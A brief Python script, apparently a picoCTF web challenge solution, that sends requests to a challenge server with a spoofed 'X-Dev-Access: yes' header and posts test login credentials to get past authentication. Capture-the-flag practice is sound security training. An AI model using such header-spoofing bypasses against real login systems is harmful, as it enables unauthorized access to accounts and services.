import requests

uri = 'http://amiable-citadel.picoctf.net:49744/'

custom_headers = {
    "X-Dev-Access": "yes"
}

res = requests.get(url=uri, headers=custom_headers)

data = {
    "email": "ctf-player@picoctf.org",
    "password": "test"
}

res_login  = requests.post(url=uri + "/login", data=data, headers=custom_headers)
print(res_login.status_code)
print(res_login.text)